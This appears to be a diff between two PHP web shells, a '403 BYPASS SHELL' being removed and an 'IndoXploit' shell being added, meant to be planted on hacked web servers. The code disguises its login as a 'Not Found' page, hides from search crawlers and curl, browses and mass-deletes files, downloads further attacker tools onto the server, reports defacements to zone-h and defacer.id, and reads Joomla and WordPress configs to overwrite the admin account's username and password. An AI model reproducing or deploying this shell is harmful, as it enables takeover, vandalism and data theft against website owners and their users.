@@ -1,1756 +1,1824 @@
 <?php
-set_time_limit(0);
-error_reporting(0); 
 session_start();
-@ini_set('error_log',null);
+error_reporting(0);
+set_time_limit(0);
+@set_magic_quotes_runtime(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-date_default_timezone_set('Asia/Jakarta');
-$_n = '403 BYPASS SHELL';
-$pw = "b99834bc19bbad24580b3adfa04fb947";
-$alert="<script>
-window.location.href='?1337=".$_GET['act']."';
-</script>";
-@define('title', '403 BYPASS SHELL');
-@define('icons', '#');
-@define('icon_folder','<img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA'.'AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp'.'/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=">');
-@define('icon_file','<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/P0x4d957169be41a75F466C49F955024E0644992890YII=">');
 
+$password = "b71c31bca4b9d422190405c8f24049fb"; # password: privdayz
 
-if(!isset($_SESSION['fz'])){
-    $fz="13";
-}else{
-    $fz=$_SESSION['fz'];
-}
-if(!isset($_SESSION['bg'])){
-    $bg="#000000";
-}else{
-    $bg=$_SESSION['bg'];
-}
-if(!isset($_SESSION['col'])){
-    $col="#FF0000";
-}else{
-    $col=$_SESSION['col'];
-}
-if(!isset($_SESSION['pcol'])){
-    $pcol="";
-}else{
-    $pcol=$_SESSION['pcol'];
-}
-if(isset($_SESSION['responsive'])){
-    $resmod='<a href="?act='.$_GET['403 BYPASS SHELL'].'&mobile_off='.$_GET['403 BYPASS SHELL'].'">[ON]</a>';
-}else{
-    $resmod='<a href="?act='.$_GET['403 BYPASS SHELL'].'&mobile='.$_GET['403 BYPASS SHELL'].'">[OFF]</a>';
-}
-if(isset($_POST['submitfz'])){
-    $_SESSION['fz']=$_POST['fz'];
-    echo"<meta http-equiv='refresh' content='0;URL=?font-size=".$_SESSION['fz']."'>";
-}
-if(isset($_POST['submitbg'])){
-    $_SESSION['bg']=$_POST['bgcolor'];
-    echo"<meta http-equiv='refresh' content='0;URL=?bgcolor=".$_SESSION['bg']."'>";
-}
-if(isset($_POST['submitcol'])){
-    $_SESSION['col']=$_POST['color'];
-    echo"<meta http-equiv='refresh' content='0;URL=?font-color=".$_SESSION['col']."'>";
-}
-if(isset($_POST['submitpc'])){
-    $_SESSION['pcol']=$_POST['pcolor'];
-echo"<meta http-equiv='refresh' content='0;URL=?public-font-color=".$_SESSION['pcol']."'>";
-}
-function shutdown57_login() { 
-echo"
-<title>403 BYPASS SHELL</title>
-<link rel='icon' type='image/x-icon' href='#'>
-</head><body>
-<div id='forbid'>
-<h1>Not Found</h1>
-<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.
-<hr></div>
-<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['HTTP_HOST']." Port ".$_SERVER['REMOTE_PORT']."</address></p><br></div>";
+$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
+$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
 
-{
-
-    echo'
-<style>
-body{
-background:#000;
-backgroud-size:100%;
-}
-input{
-text-align:center;
-border-top:1px solid red;
-border-left:1px solid red;
-border-bottom:1px solid red;
-border-right:1px solid red;
-background:transparent;
-color:red;
-height:30px;
-}
-input:hover{
-transition-duration:0.5s;
--o-transition-duration:0.5s;
--moz-transition-duration:0.5s;
--webkit-transition-duration:0.5s;
-border-style:dashed;
-cursor:pointer;
-}
-#forbid{
-    display:none;
-}
-table{
-    margin-top:8px;
-    width: max-content;
-    font-family: "Segoe UI", sans-serif;
-    padding: 25px 28px;
-    background: #151414;
-    border-radius: 6px;
-    border: 1px solid red;
-    animation: popup 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-}
-h1 { font-family: "Anonymous Pro"; font-size: 24px; font-style: normal; font-variant: normal; font-weight: 700; line-height: 26.4px; } h3 { font-family: "Anonymous Pro"; font-size: 14px; font-style: normal; font-variant: normal; font-weight: 700; line-height: 15.4px; } p { font-family: "Anonymous Pro"; font-size: 14px; font-style: normal; font-variant: normal; font-weight: 400; line-height: 20px; } blockquote { font-family: "Anonymous Pro"; font-size: 21px; font-style: normal; font-variant: normal; font-weight: 400; line-height: 30px; } pre { font-family: "Anonymous Pro"; font-size: 13px; font-style: normal; font-variant: normal; font-weight: 400; line-height: 18.5714px; }
-
-</style>
-<center>
-<form method="post">
-<td colspan=2>
-<table title="Welcome '.$_SERVER['REMOTE_ADDR'].' 403 BYPASS SHELL ">
-   <center><img title="403 BYPASS SHELL" class="picture" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f5/Circle_sign_403.svg/1200px-Circle_sign_403.svg.png" width="275px" height="275px"/></center>
-<h1 style="color:lime;text-shadow:2px 3px 5px lime;"><center> 403 BYPASS SHELL </h1><br><font color=red> <center>"WELCOME <b>'.$_SERVER['REMOTE_ADDR'].'</b> TO 403 BYPASS SHELL AT '.$_SERVER['HTTP_HOST'].' "</font></td></center>
-<tr><td><font color=white size=3 face=courier new> USERNAME :</font></td><td>
-<input style="color:white" type="text" value="403 BYPASS SHELL" title="you can\'t change this username." disabled></td></tr>
-<tr><td><font color=white size=3 face=courier new> PASSWORD :</font></td><td>
-<input type="password" name="pass" ></td></tr>
-<tr><td colspan=2><input type="submit" value="LOGIN" style="width:100%;color:red;"></td></tr>
-</table>
-<footer style="bottom:0;left:0;position:fixed;color:#fff">DEVELOPED BY | 403 BYPASS SHELL</footer><br><br><br><br>
-  </center> 
-    ';
-}    
-    exit; 
-}
-
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
-    if( empty( $pw ) || 
-        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $pw) ) ){
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-
-function irt($pw)
-{ 
-$pw=gzinflate(base64_decode($pw));
-
- for($i=0;$i<strlen($pw);$i++)
- {
-
-$pw[$i] = chr(ord($pw[$i])-1);
-
- }
- return $pw;
- }
-
-function true($md5)
-{ 
-$md5=gzinflate(base64_decode($md5));
-
- for($i=0;$i<strlen($md5);$i++)
- {
-
-$md5[$i] = chr(ord($md5[$i])-1);
-
- }
- return $md5;
- }
-
-    }else {
-
-        shutdown57_login();
-    }
-
-$_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
-$_r = "required='required'";
-$_x = "<i class='bi bi-menu-up'></i>";
-if(isset($_GET['option']) && $_POST['opt'] == 'download'){
-    header('Content-type: text/plain');
-    header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
-echo(file_get_contents($_POST['path']));
-        exit;        
-    }
-function ▟($path,$p) {
-if(isset($_GET['path'])) {
-    $▚ = $_GET['path'];
-} else {
-    $▚ = getcwd();
-}
-if(is_writable($▚)) {
-    return "<gr class='anu'>".$p."</gr>";
-} else {
-    return "<rd class='anu'>".$p."</rd>";
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
     }
 }
-function ok(){
-    echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
-}
-function er(){
-    echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
-}
-function sz($byt){
-    $sz = array('B','KB','MB','GB','TB');
-    for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );
-    return(round($byt,2)." ".$sz[$i]);
-}
-function ip() {
-    $ipas = '';
-if(getenv('HTTP_CLIENT_IP'))
-    $ipas = getenv('HTTP_CLIENT_IP');
-else if(getenv('HTTP_X_FORWARDED_FOR'))
-    $ipas = getenv('HTTP_X_FORWARDED_FOR');
-else if(getenv('HTTP_X_FORWARDED'))
-    $ipas = getenv('HTTP_X_FORWARDED');
-else if(getenv('HTTP_FORWARDED_FOR'))
-    $ipas = getenv('HTTP_FORWARDED_FOR');
-else if(getenv('HTTP_FORWARDED'))
-    $ipas = getenv('HTTP_FORWARDED');
-else if(getenv('REMOTE_ADDR'))
-    $ipas = getenv('REMOTE_ADDR');
-else
-    $ipas = 'IP tidak dikenali';
-return $ipas;
-}
-function p($file){
-if($p = @fileperms($file)){
-    $i = 'u';
-if(($p & 0xC000) == 0xC000)$i = 's';
-elseif(($p & 0xA000) == 0xA000)$i = 'l';
-elseif(($p & 0x8000) == 0x8000)$i = '-';
-elseif(($p & 0x6000) == 0x6000)$i = 'b';
-elseif(($p & 0x4000) == 0x4000)$i = 'd';
-elseif(($p & 0x2000) == 0x2000)$i = 'c';
-elseif(($p & 0x1000) == 0x1000)$i = 'p';
-    $i .= ($p & 00400)? 'r':'-';
-    $i .= ($p & 00200)? 'w':'-';
-    $i .= ($p & 00100)? 'x':'-';
-    $i .= ($p & 00040)? 'r':'-';
-    $i .= ($p & 00020)? 'w':'-';
-    $i .= ($p & 00010)? 'x':'-';
-    $i .= ($p & 00004)? 'r':'-';
-    $i .= ($p & 00002)? 'w':'-';
-    $i .= ($p & 00001)? 'x':'-';
-return $i;
-    }
-    else return "- ?? -";
-}
-$disfunc = @ini_get("disable_functions");
-if(empty($disfunc)) {
-    $disfc = "<gr>NONE</gr>";
-} else {
-    $disfc = "<rd>$disfunc</rd>";
-}
-if(!function_exists('posix_getegid')) {
-    $user = @get_current_user();
-    $uid = @getmyuid();
-    $gid = @getmygid();
-    $group = "?";
-} else {
-    $uid = @posix_getpwuid(posix_geteuid());
-    $gid = @posix_getgrgid(posix_getegid());
-    $user = $uid['name'];
-    $uid = $uid['uid'];
-    $group = $gid['name'];
-    $gid = $gid['gid'];
-}
-$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
 
-echo "
+function login_shell() {
+?>
 <!DOCTYPE HTML>
 <html>
-    <head>
-        <meta name='author' content='$_n'>
-        <meta name='robots' content='noindex,nofollow'>
-        <title>".$_SERVER['HTTP_HOST']." - $_n</title>
-        <meta name='viewport' content='width=device-width, initial-scale=0.70'>
-        <link rel='stylesheet' href='//meki.google.co.ws/style.css'>
-        <script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
-        <script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
-        <script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
-<body class='bg-secondary text-light'>
-<div class='container-fluid'>
-    <div class='py-3' id='main'>
-        <div class='box shadow bg-dark p-4 rounded-3'>
-            <div class='corner text-secondary anu'>BYPASS SHELL 403</div>
-            <img src=https://upload.wikimedia.org/wikipedia/commons/thumb/f/f5/Circle_sign_403.svg/1200px-Circle_sign_403.svg.png width=80px height=80px></img>
-
-                <a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>$_n</h4></a>";
-                if(isset($_GET['path'])){
-                    $path = $_GET['path'];
-                } else {
-                    $path = getcwd();
-                }
-                    $path = str_replace('\\','/',$path);
-                    $paths = explode('/',$path);
-                foreach($paths as $id=>$pat){
-                if($pat == '' && $id == 0){
-                    $a = true;
-                    echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
-                continue;
-                }
-                if($pat == '') continue;
-                    echo '<a class="text-decoration-none" href="?path=';
-                for($i=0;$i<=$id;$i++){
-                    echo "$paths[$i]";
-                if($i != $id) echo "/";
-                }
-                echo '">'.$pat.'</a>/';
-                }
-                echo " [ ".▟($path, p($path))." ]</div>";
-            echo "
-        </div>
-    </div>
-</div>
-<div class='container-fluid'>
-    <div class='box shadow bg-dark p-4 rounded-3'>
-        <div class='corner anu'>
-            <p style=color:red data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'><i class='bi bi-info-circle'></i> SERVER INFO <i class='bi bi-chevron-down'></i></p>
-        </div>
-    <div class='collapse text-dark mb-3' id='collapseExample'>
-        <div class='box shadow bg-light p-4 rounded-3'>
-            Uname: <gr>".php_uname()."</gr><br />
-            Software: <gr>".$_SERVER['SERVER_SOFTWARE']."</gr><br />
-            PHP version: <gr>".PHP_VERSION."</gr> <a class='text-decoration-none' href='?phpinfo&path=$path'>[ PHP INFO ]</a> PHP os: <gr>".PHP_OS."</gr><br />
-            Server Ip: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br />
-            Your Ip: <gr>".ip()."</gr><br />
-            User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br />
-            Safe Mode: $sm<br />
-            Disable Function:<div class='table-responsive'>$disfc</div>
-        </div>
-    </div>
-<div class='text-center'>
-    <div class='btn-group'>
-        <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?'></i>HOME</a>
-        <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?upload&path=$path'></i>UPLOAD</a>
-        <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?mass_deface&path=$path'></i>MASS DEFACE</a>
-        <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=zoneh'>ZONE-H</a>
-        <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=defacer'>DEFACER ID</a>
-        <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?mass_delete&path=$path'></i>MASS DELETE</a>
-    </div>
-    <div class='text-center'>
-    <div class='btn-group'>
-    <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&web=jumping'>JUMPING</a>
-    <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=config'>GRAB CONFIG</a>
-    <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=edit_user'>AUTO EDIT USER JOOMLA</a>
-    <a style=margin:3px; class='btn btn-outline-light btn-sm' href='?act=logout'>LOGOUT</a>
-    </div>
-</div>";
-// tools nya
-if ($_GET['act']=='logout') {
-    session_destroy();
-    echo'<script>
-    alert("Logout Successfully !!!!!!!!");
-    window.location.href="?";
-    </script>';
+<head>
+<meta name="robots" content"noindex. nofollow">
+<title>IndoXploit</title>
+<style type="text/css">
+html {
+	margin: 20px auto;
+	background: #000000;
+	color: green;
+	text-align: center;
 }
-if(isset($_GET['path'])) {
-    $dir = $_GET['path'];
-    chdir($dir);
-} else {
-    $dir = getcwd();
+header {
+	color: green;
+	margin: 10px auto;
 }
-$dir = str_replace("\\","/",$dir);
-$scdir = explode("/", $dir);    
-for($i = 0; $i <= $c_dir; $i++) {
-    $scdir[$i];
-    if($i != $c_dir) {
+input[type=password] {
+	width: 250px;
+	height: 25px;
+	color: red;
+	background: transparent;
+	border: 1px dotted green;
+	margin-left: 20px;
+	text-align: center;
 }
-if ($_GET['do'] == 'adminer') {
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-    function adminer($url, $isi) {
-        $fp = fopen($isi, "w");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        return curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-        ob_flush();
-        flush();
-    }
-    if (file_exists('adminer.php')) {
-        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/adminer.php' target='_blank'>ADMINER LOGIN</a></font></center>";
-    } else {
-        if (adminer("#", "adminer.php")) {
-            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/adminer.php' target='_blank'>ADMINER LOGIN</a></font></center>";
-        } else {
-            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create admin file</font></center>";
-        }
-    }
-}
-if ($_GET['do'] == 'resetcpanelpw') {
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-    function adminer($url, $isi) {
-        $fp = fopen($isi, "w");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        return curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-        ob_flush();
-        flush();
-    }
-    if (file_exists('cpreset.php')) {
-        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>CPANEL RESET PASSWORD CLICK HERE !</a></font></center>";
-    } else {
-        if (adminer("#", "cpreset.php")) {
-            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>CPANEL RESET PASSWORD CLICK HERE !</a></font></center>";
-        } else {
-            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create cpanel file</font></center>";
-        }
-    }
-}
-if ($_GET['do'] == 'unzip') {
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-    function adminer($url, $isi) {
-        $fp = fopen($isi, "w");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        return curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-        ob_flush();
-        flush();
-    }
-    if (file_exists('unzip.php')) {
-        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/unzip.php' target='_blank'>UNZIP</a></font></center>";
-    } else {
-        if (adminer("#", "unzip.php")) {
-            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>UNZIP</a></font></center>";
-        } else {
-            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create unzipper file</font></center>";
-        }
-    }
-}
-if ($_GET['do'] == 'mailer') {
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-    function adminer($url, $isi) {
-        $fp = fopen($isi, "w");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        return curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-        ob_flush();
-        flush();
-    }
-    if (file_exists('mail.php')) {
-        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php?pass=eTrx!tgd' target='_blank'>CLICK HERE PHP MAILER</a></font></center>";
-    } else {
-        if (adminer("#", "mail.php")) {
-            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php?pass=eTrx!tgd' target='_blank'>CLICK HERE PHP MAILER</a></font></center>";
-        } else {
-            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create mailer file</font></center>";
-        }
-    }
-}
-if ($_GET['do'] == 'uploader') {
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-    function adminer($url, $isi) {
-        $fp = fopen($isi, "w");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        return curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-        ob_flush();
-        flush();
-    }
-    if (file_exists('upl.php')) {
-        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/upl.php?prv8-upl' target='_blank'>PHP UPLOADER</a></font></center>";
-    } else {
-        if (adminer("#", "upl.php")) {
-            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/upl.php?prv8-upl' target='_blank'>PHP UPLOADER</a></font></center>";
-        } else {
-            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create uploader file</font></center>";
-        }
-    }
-}
-if ($_GET['do'] == 'smtp') {
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-    function adminer($url, $isi) {
-        $fp = fopen($isi, "w");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        return curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-        ob_flush();
-        flush();
-    }
-    if (file_exists('smtp.php')) {
-        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php' target='_blank'>SMTP</a></font></center>";
-    } else {
-        if (adminer("#", "smtp.php")) {
-            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/smtp.php' target='_blank'>SMTP</a></font></center>";
-        } else {
-            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create smtp file</font></center>";
-        }
-    }
-}
-if($_GET['do'] == 'defacer') {
-echo "<center><form method='post'>
-        <u>Defacer</u>: <br>
-        <input type='text' name='notiper' size='50' value='403 BYPASS SHELL'><br>
-        <u>Team</u>: <br>
-        <input type='text' name='tim' size='50' value='403 BYPASS SHELL'><br>
-        <u>Domains</u>: <br>
-        <textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
-        <input type='submit' name='go' value='Submit' style='width: 450px;'>
-        </form>";
-$site = explode("\r\n", $_POST['sites']);
-$go = $_POST['go'];
-$notiper = $_POST['notiper'];
-$tim = $_POST['tim'];
-if($go) {
-foreach($site as $sites) {
-$zh = $sites;
-$form_url = "https://defacer.id/archive/notify";
-$data_to_post = array();
-$data_to_post['attacker'] = "$notiper";
-$data_to_post['team'] = "$tim";
-$data_to_post['poc'] = 'SQL Injection';
-$data_to_post['url'] = "$zh";
-$curl = curl_init();
-curl_setopt($curl,CURLOPT_URL, $form_url);
-curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
-curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
-curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
-$result = curl_exec($curl);
-echo $result;
-curl_close($curl);
-echo "<br>";
-}
-}
-}
-if($_GET['do'] == 'zoneh') {
-    if($_POST['submit']) {
-        $domain = explode("\r\n", $_POST['url']);
-        $nick =  $_POST['nick'];
-        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
-        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
-        function zoneh($url,$nick) {
-            $ch = curl_init("http://www.zone-h.com/notify/single");
-                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                  curl_setopt($ch, CURLOPT_POST, true);
-                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
-            return curl_exec($ch);
-                  curl_close($ch);
-        }
-        foreach($domain as $url) {
-            $zoneh = zoneh($url,$nick);
-            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
-                echo "$url -> <font color=#18BC9C>OK</font><br>";
-            } else {
-                echo "$url -> <font color=red>ERROR</font><br>";
-            }
-        }
-    } else {
-        echo "<center><form method='post'>
-        <u>Defacer</u>: <br>
-        <input type='text' name='nick' size='50' value='403 BYPASS SHELL'><br>
-        <u>Domains</u>: <br>
-        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
-        <input type='submit' class='btn btn-success btn-sm' name='submit' value='Submit' style='width: 450px;'>
-        </form>";
-    }
-} elseif($_GET['do'] == 'edit_user') {
-    if($_POST['hajar']) {
-        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
-            echo "Username or Password must be more than 6 characters";
-        } else {
-            $user_baru = $_POST['user_baru'];
-            $pass_baru = md5($_POST['pass_baru']);
-            $conf = $_POST['config_dir'];
-            $scan_conf = scandir($conf);
-            foreach($scan_conf as $file_conf) {
-                if(!is_file("$conf/$file_conf")) continue;
-                $config = file_get_contents("$conf/$file_conf");
-                if(preg_match("/JConfig|joomla/",$config)) {
-                    $dbhost = ambilkata($config,"host = '","'");
-                    $dbuser = ambilkata($config,"user = '","'");
-                    $dbpass = ambilkata($config,"password = '","'");
-                    $dbname = ambilkata($config,"db = '","'");
-                    $dbprefix = ambilkata($config,"dbprefix = '","'");
-                    $prefix = $dbprefix."users";
-                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
-                    $db = mysql_select_db($dbname);
-                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
-                    $result = mysql_fetch_array($q);
-                    $id = $result['id'];
-                    $site = ambilkata($config,"sitename = '","'");
-                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
-                    echo "Config => ".$file_conf."<br>";
-                    echo "CMS => Joomla<br>";
-                    if($site == '') {
-                        echo "Sitename => <font color=red>Error, can't get the domain name</font><br>";
-                    } else {
-                        echo "Sitename => $site<br>";
-                    }
-                    if(!$update OR !$conn OR !$db) {
-                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
-                    } else {
-                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
-                    }
-                    mysql_close($conn);
-                } elseif(preg_match("/WordPress/",$config)) {
-                    $dbhost = ambilkata($config,"DB_HOST', '","'");
-                    $dbuser = ambilkata($config,"DB_USER', '","'");
-                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
-                    $dbname = ambilkata($config,"DB_NAME', '","'");
-                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
-                    $prefix = $dbprefix."users";
-                    $option = $dbprefix."options";
-                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
-                    $db = mysql_select_db($dbname);
-                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
-                    $result = mysql_fetch_array($q);
-                    $id = $result[ID];
-                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
-                    $result2 = mysql_fetch_array($q2);
-                    $target = $result2[option_value];
-                    if($target == '') {
-                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
-                    } else {
-                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
-                    }
-                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
-                    echo "Config => ".$file_conf."<br>";
-                    echo "CMS => Wordpress<br>";
